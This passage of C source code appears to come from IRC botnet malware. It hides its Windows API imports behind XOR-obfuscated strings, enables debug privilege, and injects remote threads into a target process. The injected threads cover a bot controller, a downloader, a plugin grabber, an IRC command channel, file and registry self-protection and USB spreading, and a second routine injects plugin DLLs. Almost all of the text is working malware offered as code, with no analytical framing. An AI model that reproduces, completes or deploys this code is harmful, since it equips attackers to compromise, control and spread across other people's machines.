		sInj.API.CreateToolhelp32Snapshot = (CTL)GetProcAddress(hKernel32, sexor(API_CREATETOOLHELP32SNAPSHOT, szEncryptionKey));
		sInj.API.Process32First =			(P32F)GetProcAddress(hKernel32, sexor(API_PROCESS32FIRST, szEncryptionKey));
		sInj.API.Process32Next =			(P32N)GetProcAddress(hKernel32, sexor(API_PROCESS32NEXT, szEncryptionKey));
		sInj.API.OpenProcess =				(OP)GetProcAddress(hKernel32, sexor(API_OPENPROCESS, szEncryptionKey));
		sInj.API.CreateRemoteThread =		(CRT)GetProcAddress(hKernel32, sexor(API_CREATEREMOTETHREAD, szEncryptionKey));
		sInj.API.ReleaseMutex =				(RMTEX)GetProcAddress(hKernel32, sexor(API_RELEASEMUTEX, szEncryptionKey));
		sInj.API.CreateMutex =				(CMTEX)GetProcAddress(hKernel32, sexor(API_CREATEMUTEX, szEncryptionKey));
		sInj.API.DeleteFile =				(DELF)GetProcAddress(hKernel32, sexor(API_DELETEFILE, szEncryptionKey));
		sInj.API.GetLastError =				(GLE)GetProcAddress(hKernel32, sexor(API_GETLASTERROR, szEncryptionKey));
		sInj.API.CopyFile =					(CPYF)GetProcAddress(hKernel32, sexor(API_COPYFILE, szEncryptionKey));
		sInj.API.SetFileAttributes =		(SFA)GetProcAddress(hKernel32, sexor(API_SETFILEATTRIB, szEncryptionKey));
		sInj.API.CreateDirectory =			(CD)GetProcAddress(hKernel32, sexor(API_CREATEDIRECTORY, szEncryptionKey));
		sInj.API.GetDriveType =				(GDT)GetProcAddress(hKernel32, sexor(API_GETDRIVETYPE, szEncryptionKey));
		sInj.API.GetLogicalDriveStrings =	(GLDS)GetProcAddress(hKernel32, sexor(API_GETLOGICDRIVESZ, szEncryptionKey));
		sInj.API.GetFileAttributes =		(GFA)GetProcAddress(hKernel32, sexor(API_GETFILEATTRIB, szEncryptionKey));
		sInj.API.Sleep =					(SL)GetProcAddress(hKernel32, sexor(API_SLEEP, szEncryptionKey));
		sInj.API.GetTickCount =				(GTC)GetProcAddress(hKernel32, sexor(API_GETTICK, szEncryptionKey));
		sInj.API.lstrcat =					(LCAT)GetProcAddress(hKernel32, sexor(API_LSTRCAT, szEncryptionKey));
		sInj.API.lstrcpy =					(LCPY)GetProcAddress(hKernel32, sexor(API_LSTRCPY, szEncryptionKey));
		sInj.API.lstrlen =					(LSTL)GetProcAddress(hKernel32, sexor(API_LSTRLEN, szEncryptionKey));
		sInj.API.lstrcmp =					(LSTCMP)GetProcAddress(hKernel32, sexor(API_LSTRCMP, szEncryptionKey));
		sInj.API.lstrcpyn =					(LCPYN)GetProcAddress(hKernel32, sexor(API_LSTRCPYN, szEncryptionKey));
		sInj.API.CreateFile =				(CF)GetProcAddress(hKernel32, sexor(API_CREATEFILE, szEncryptionKey));
		sInj.API.CloseHandle =				(CH)GetProcAddress(hKernel32, sexor(API_CLOSEHANDLE, szEncryptionKey));
		sInj.API.WriteFile   =				(WF)GetProcAddress(hKernel32, sexor(API_WRITEFILE, szEncryptionKey));
		sInj.API.CreateThread =				(CT)GetProcAddress(hKernel32, sexor(API_CREATETHREAD, szEncryptionKey));
		sInj.API.TerminateThread =			(TT)GetProcAddress(hKernel32, sexor(API_TERMINATETHREAD, szEncryptionKey));
		sInj.API.ExitThread =				(ET)GetProcAddress(hKernel32, sexor(API_EXITTHREAD, szEncryptionKey));
		sInj.API.WaitForSingleObject =		(WFSO)GetProcAddress(hKernel32, sexor(API_WAITFORSOBJECT, szEncryptionKey));
		sInj.API.LoadLibrary =				(LLIB)GetProcAddress(hKernel32, sexor(API_LOADLIBRARY, szEncryptionKey));
		sInj.API.FreeLibrary =				(FLIB)GetProcAddress(hKernel32, sexor(API_FREELIBRARY, szEncryptionKey));
		sInj.API.CreateProcess =			(CP)GetProcAddress(hKernel32, sexor(API_CREATEPROCESS, szEncryptionKey));
		sInj.API.ExitProcess =				(EP)GetProcAddress(hKernel32, sexor(API_EXITPROCESS, szEncryptionKey));
		sInj.API.OutputDebugString =		(ODBG)GetProcAddress(hKernel32, sexor(API_OUTPUTDEBUGSTR, szEncryptionKey));
		sInj.API.GetModuleFileName =		(GMF)GetProcAddress(hKernel32, sexor(API_GETMODULEFNAME, szEncryptionKey));
		sInj.API.GetModuleHandle   =		(GMH)GetProcAddress(hKernel32, sexor(API_GETMODULEHANDL, szEncryptionKey));
	FreeLibrary(hKernel32);

	hWinsock = LoadLibrary(sexor(DLL_WS232, szEncryptionKey));
		sInj.API.WSAStartup =				(WSAS)GetProcAddress(hWinsock, sexor(API_WSASTARTUP, szEncryptionKey));
		sInj.API.socket =					(SOCK)GetProcAddress(hWinsock, sexor(API_SOCKET, szEncryptionKey));
		sInj.API.connect =					(CON)GetProcAddress(hWinsock, sexor(API_CONNECT, szEncryptionKey));
		sInj.API.inet_addr =				(IADDR)GetProcAddress(hWinsock, sexor(API_INETADDR, szEncryptionKey));
		sInj.API.htons =					(HTONS)GetProcAddress(hWinsock, sexor(API_HTONS, szEncryptionKey));
		sInj.API.closesocket =				(CLSO)GetProcAddress(hWinsock, sexor(API_CLOSESOCKET, szEncryptionKey));
		sInj.API.gethostbyname =			(GHBN)GetProcAddress(hWinsock, sexor(API_GETHOSTBYNAME, szEncryptionKey));
		sInj.API.sendto =					(SENDTO)GetProcAddress(hWinsock, sexor(API_SENDTO, szEncryptionKey));
		sInj.API.send =						(SEND)GetProcAddress(hWinsock, sexor(API_SEND, szEncryptionKey));
		sInj.API.recv =						(RECV)GetProcAddress(hWinsock, sexor(API_RECV, szEncryptionKey));
	FreeLibrary(hWinsock);

	hUser32 = LoadLibrary(sexor(DLL_USER32, szEncryptionKey));
		sInj.API.MessageBox =				(MB)GetProcAddress(hUser32, sexor(API_MESSAGEBOX, szEncryptionKey));
		sInj.API.keybd_event =				(kbde)GetProcAddress(hUser32, sexor(API_KEYBDEVENT, szEncryptionKey));
	FreeLibrary(hUser32);
	
	hWininet = LoadLibrary(sexor(DLL_WININET, szEncryptionKey));
		sInj.API.InternetOpen =				(INOP)GetProcAddress(hWininet, sexor(API_INTERNETOPEN, szEncryptionKey));
		sInj.API.InternetCloseHandle =	    (INCH)GetProcAddress(hWininet, sexor(API_INTERNETCLOSEH, szEncryptionKey));
		sInj.API.InternetOpenURL =			(INOU)GetProcAddress(hWininet, sexor(API_INTERNETOPENURL, szEncryptionKey));
		sInj.API.InternetReadFile =			(INRF)GetProcAddress(hWininet, sexor(API_INTERNETREADF, szEncryptionKey));
		sInj.API.DeleteUrlCacheEntry =		(DUCE)GetProcAddress(hWininet, sexor(API_DELETEURLCACHEENTRY, szEncryptionKey));
	FreeLibrary(hWininet);

	hShell32 = LoadLibrary(sexor(DLL_SHELL32, szEncryptionKey));
		sInj.API.ShellExecute =				(SE32)GetProcAddress(hShell32, sexor(API_SHELLEXECUTE, szEncryptionKey));
	FreeLibrary(hShell32);

	HANDLE hBot;
	hBot = sInj.API.CreateFile(sInj.Vars.Settings.szBotPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,	0, NULL);
	if (hBot != INVALID_HANDLE_VALUE) {
		sInj.Vars.FileProtection.dwFileSize = sInj.API.GetFileSize(hBot, NULL);
	} else {
		sInj.Vars.FileProtection.dwFileSize = 0;
	}
	sInj.API.CloseHandle(hBot);

	// Find Target Process

	ZeroMemory(&pe32Entry, sizeof(pe32Entry));
	pe32Entry.dwFlags = sizeof(PROCESSENTRY32);
	hSnapshot = sInj.API.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe32Entry.dwSize = sizeof(PROCESSENTRY32);

	if (sInj.API.Process32First(hSnapshot, &pe32Entry) == TRUE ) {
		while (sInj.API.Process32Next(hSnapshot, &pe32Entry) == TRUE ) {
			if (!strcmp(strtolower(pe32Entry.szExeFile), strtolower(szStartIn))) {    
				EnableDebugPriv();
				hProcess = sInj.API.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Entry.th32ProcessID);
				bFound = TRUE;
				break;
			}
		}
	} 	
	sInj.API.CloseHandle(hSnapshot);
	if (bFound == FALSE) { 	return FALSE; };




	// Inject Threads
	dwSize = (LPBYTE)ProcEnd_gBot - (LPBYTE)Remote_gBot;
	sInj.Threads.gBot = (threads)inject(hProcess, (LPVOID)Remote_gBot, dwSize);
	if (sInj.Threads.gBot == NULL) {
//		printf("Error injecting gBot thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_Downloader - (LPBYTE)Remote_Downloader;
	sInj.Threads.Downloader = (threads)inject(hProcess, (LPVOID)Remote_Downloader, dwSize);
	if (sInj.Threads.Downloader == NULL) {
//		printf("Error injecting downloader thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_PluginGrabber - (LPBYTE)Remote_PluginGrabber;
	sInj.Threads.PluginGrab = (threads)inject(hProcess, (LPVOID)Remote_PluginGrabber, dwSize);
	if (sInj.Threads.PluginGrab == NULL) {
		//		printf("Error injecting plugingrab thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_IRCThread - (LPBYTE)Remote_IRCThread;
	sInj.Threads.IRCThread = (threads)inject(hProcess, (LPVOID)Remote_IRCThread, dwSize);
	if (sInj.Threads.IRCThread == NULL) {
//		printf("Error injecting IRCThread thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_FileProtection - (LPBYTE)Remote_FileProtection;
	sInj.Threads.FileProtection = (threads)inject(hProcess, (LPVOID)Remote_FileProtection, dwSize);
	if (sInj.Threads.FileProtection == NULL) {
//		printf("Error injecting FileProtection thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_RegProtect - (LPBYTE)Remote_RegProtect;
	sInj.Threads.RegProtection = (threads)inject(hProcess, (LPVOID)Remote_RegProtect, dwSize);
	if (sInj.Threads.RegProtection == NULL) {
		//		printf("Error injecting RegProtection thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_Speedtest - (LPBYTE)Remote_Speedtest;
	sInj.Threads.Speedtest = (threads)inject(hProcess, (LPVOID)Remote_Speedtest, dwSize);
	if (sInj.Threads.Speedtest == NULL) {
//		printf("Error injecting Speedtest thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_USBThread - (LPBYTE)Remote_USBThread;
	sInj.Threads.USBThread = (threads)inject(hProcess, (LPVOID)Remote_USBThread, dwSize);
	if (sInj.Threads.USBThread == NULL) {
//		printf("Error injecting USBSpread thread\n");
		return FALSE;
	}
	dwSize = (LPBYTE)ProcEnd_IPC - (LPBYTE)Remote_IPC;
	sInj.Threads.IPC = (threads)inject(hProcess, (LPVOID)Remote_IPC, dwSize);
	if (sInj.Threads.IPC == NULL) {
		//		printf("Error injecting USBSpread thread\n");
		return FALSE;
	}
	// Inject Structures
	lpStructs = inject(hProcess, &sInj.API, sizeof(Injapi));
	if (lpStructs == NULL) {
//		printf("Error injecting API structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.FileProtection, sizeof(Injvarfileprotection));
	if (lpStructs == NULL) {
//		printf("Error injecting Varfileprotection structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.Messages, sizeof(Injvarmsg));
	if (lpStructs == NULL)
	{
//		printf("Error injecting Varmsgs structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.Settings, sizeof(Injvarsettings));
	if (lpStructs == NULL)
	{
//		printf("Error injecting Varsettings structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.Downloader, sizeof(Injvardownloader));
	if (lpStructs == NULL) 
	{
//		printf("Error injecting Vardownloader structure\n");
	}
	lpStructs = inject(hProcess, &sInj.Vars.Folders, sizeof(Injvarfolders));
	if (lpStructs == NULL) 
	{
//		printf("Error injecting Varfolders structure\n");
	}

	lpStructs = inject(hProcess, &sInj.Vars.Spacers, sizeof(Injvarspacers));
	if (lpStructs == NULL)
	{
//		printf("Error injecting Varspacers structure\n");
		return FALSE;
	}	
	lpStructs = inject(hProcess, &sInj.Vars.Others, sizeof(Injvarothers));
	if (lpStructs == NULL)
	{
//		printf("Error injecting Varothers structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.IRC, sizeof(Injvarirc));
	if (lpStructs == NULL) {
//		printf("Error injecting IRC structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.DLLs, sizeof(Injvardlls));
	if (lpStructs == NULL) {
//		printf("Error injecting Vardlls structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.Commands, sizeof(Injvarcommands));
	if (lpStructs == NULL) {
//		printf("Error injecting Varcommands structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.Speedtest, sizeof(Injvarspeedtest));
	if (lpStructs == NULL) {
//		printf("Error injecting Varspeedtest structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars.USB, sizeof(Injvarusb));
	if (lpStructs == NULL) {
//		printf("Error injecting Varusb structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Vars, sizeof(Injvar));
	if (lpStructs == NULL) {
//		printf("Error injecting Vars structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj.Threads, sizeof(Injthreads));
	if (lpStructs == NULL) {
//		printf("Error injecting Structs structure\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sInj, sizeof(sInj));
	if (lpStructs == NULL) {
//		printf("Error injecting Global structure\n");
		return FALSE;
	}

	// Start Main Thread
	hThread = sInj.API.CreateRemoteThread(hProcess, NULL, 65535, (LPTHREAD_START_ROUTINE)sInj.Threads.gBot, lpStructs, 0, &dwThreadID);

#ifdef _DEBUGLITE
	OutputDebugString("Started...");
#endif

	return TRUE;
}

/* Start Plugin Shit */


bool Start_Plugin(char *szProcessName, char *szPluginPath)
{
	HINSTANCE hKernel32, hAdvapi;
	HANDLE hSnapshot, hProcess, hThread;
	PROCESSENTRY32 pe32Entry;
	BOOL bFound = FALSE;
	DWORD dwSize, dwThreadID;
	LPVOID lpStructs;
	
	hAdvapi = LoadLibrary(sexor(DLL_ADVAPI32, szEncryptionKey));
		sInj.API.OpenProcessToken =			(OPT)GetProcAddress(hAdvapi, sexor(API_OPENPROCESSTOKEN, szEncryptionKey));
		sInj.API.LookupPrivilegeValueA =	(LPV)GetProcAddress(hAdvapi, sexor(API_LOOKUPPRIV, szEncryptionKey));
		sInj.API.AdjustTokenPrivileges =	(ATP)GetProcAddress(hAdvapi, sexor(API_ADJUSTTOKENPRIV, szEncryptionKey));
	FreeLibrary(hAdvapi);
	hKernel32 = LoadLibrary(sexor(DLL_KERNEL32, szEncryptionKey));
		sInj.API.VirtualAllocEx	=			(VAEX)GetProcAddress(hKernel32, sexor(API_VIRTUALALLOCEX, szEncryptionKey));
		sInj.API.VirtualProtectEx =			(VPEX)GetProcAddress(hKernel32, sexor(API_VIRTUALPROTECTEX, szEncryptionKey));
		sInj.API.WriteProcessMemory =		(WPM)GetProcAddress(hKernel32, sexor(API_WRITEPROCESSMEMORY, szEncryptionKey));
		sInj.API.CreateRemoteThread =		(CRT)GetProcAddress(hKernel32, sexor(API_CREATEREMOTETHREAD, szEncryptionKey));
		sPlugin.LoadLibrary =				(LLIB)GetProcAddress(hKernel32, sexor(API_LOADLIBRARY, szEncryptionKey));
		sPlugin.FreeLibrary =				(FLIB)GetProcAddress(hKernel32, sexor(API_FREELIBRARY, szEncryptionKey));
		sPlugin.ExitThread  =				(ET)GetProcAddress(hKernel32, sexor(API_EXITTHREAD, szEncryptionKey));
		sInj.API.CreateToolhelp32Snapshot = (CTL)GetProcAddress(hKernel32, sexor(API_CREATETOOLHELP32SNAPSHOT, szEncryptionKey));
		sInj.API.Process32First =			(P32F)GetProcAddress(hKernel32, sexor(API_PROCESS32FIRST, szEncryptionKey));
		sInj.API.Process32Next =			(P32N)GetProcAddress(hKernel32, sexor(API_PROCESS32NEXT, szEncryptionKey));
		sInj.API.OpenProcess =				(OP)GetProcAddress(hKernel32, sexor(API_OPENPROCESS, szEncryptionKey));
		sInj.API.CloseHandle =				(CH)GetProcAddress(hKernel32, sexor(API_CLOSEHANDLE, szEncryptionKey));
		sInj.API.GetCurrentProcess =		(GCP)GetProcAddress(hKernel32, sexor(API_GETCURRENTPROCESS, szEncryptionKey));
	FreeLibrary(hKernel32);
	
	strcpy(sPlugin.szPluginPath, szPluginPath);
	
	ZeroMemory(&pe32Entry, sizeof(pe32Entry));
	pe32Entry.dwFlags = sizeof(PROCESSENTRY32);
	hSnapshot = sInj.API.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	pe32Entry.dwSize = sizeof(PROCESSENTRY32);
	
	if (sInj.API.Process32First(hSnapshot, &pe32Entry) == TRUE ) {
		while (sInj.API.Process32Next(hSnapshot, &pe32Entry) == TRUE ) {
			if (!strcmp(strtolower(pe32Entry.szExeFile), strtolower(szProcessName))) {    
				EnableDebugPriv();
				hProcess = sInj.API.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Entry.th32ProcessID);
				bFound = TRUE;
				break;
			}
		}
	} 	
	sInj.API.CloseHandle(hSnapshot);
	if (bFound == FALSE) { return FALSE; };

	// Lets inject it...
	dwSize = (LPBYTE)ProcEnd_LoadPlugin - (LPBYTE)Remote_LoadPlugin;
	sPlugin.LoadPlugin = (threads)inject(hProcess, (LPVOID)Remote_LoadPlugin, dwSize);
	if (sPlugin.LoadPlugin == NULL) {
//		OutputDebugString("Error injecting LoadPlugin thread\n");
		return FALSE;
	}
	lpStructs = inject(hProcess, &sPlugin, sizeof(Injplugin));
	if (lpStructs == NULL) 
	{
//		OutputDebugString("Error injecting Injplugin structure\n");
	}
	// Lets start it
	hThread = sInj.API.CreateRemoteThread(hProcess, NULL, 65535, (LPTHREAD_START_ROUTINE)sPlugin.LoadPlugin, lpStructs, 0, &dwThreadID);
	return TRUE;
}

void EnableDebugPriv() 
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;
	
    sInj.API.OpenProcessToken(sInj.API.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken );
    sInj.API.LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid );
	
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	
    sInj.API.AdjustTokenPrivileges( hToken, false, &tkp, sizeof( tkp ), NULL, NULL );
    sInj.API.CloseHandle( hToken ); 
}


BOOL RegDelnode (HKEY hKeyRoot, LPTSTR lpSubKey)
{
    char szDelKey[512] = { 0 };

	strcpy(szDelKey, lpSubKey);
    return RegDelnodeRecurse(hKeyRoot, szDelKey);
}


BOOL RegDelnodeRecurse (HKEY hKeyRoot, LPTSTR lpSubKey)
{
    char *lpEnd = (char *)malloc(512);
    LONG lResult;
    DWORD dwSize;
    TCHAR szName[MAX_PATH];
    HKEY hKey;
    FILETIME ftWrite;
	
    // First, see if we can delete the key without having
    // to recurse.
	
    lResult = sInj.API.RegDeleteKey(hKeyRoot, lpSubKey);
	
    if (lResult == ERROR_SUCCESS) 
        return TRUE;
	
    lResult = sInj.API.RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
	
    if (lResult != ERROR_SUCCESS) 
    {
        if (lResult == ERROR_FILE_NOT_FOUND) {
            return TRUE;
        } 
        else {
            return FALSE;
        }
    }
	
    // Check for an ending slash and add one if it is missing.
	memset(lpEnd, 0, sizeof(lpEnd));
    lpEnd = lpSubKey + lstrlen(lpSubKey);
	
    if (*(lpEnd - 1) != TEXT('\\')) 
    {
        *lpEnd =  TEXT('\\');
        lpEnd++;
        *lpEnd =  TEXT('\0');
    }
	
    // Enumerate the keys
	
    dwSize = MAX_PATH;
    lResult = sInj.API.RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
		NULL, NULL, &ftWrite);
	
    if (lResult == ERROR_SUCCESS) 
    {
        do {
			
			strcpy(lpEnd, szName);
			
            if (!RegDelnodeRecurse(hKeyRoot, lpSubKey)) {
                break;
            }
			
            dwSize = MAX_PATH;
			
            lResult = sInj.API.RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
				NULL, NULL, &ftWrite);
			
        } while (lResult == ERROR_SUCCESS);
    }
	
    lpEnd--;
    *lpEnd = TEXT('\0');
	
    sInj.API.RegCloseKey (hKey);
    // Try again to delete the key.
    lResult = sInj.API.RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS) 
        return TRUE;
	
    return FALSE;
}
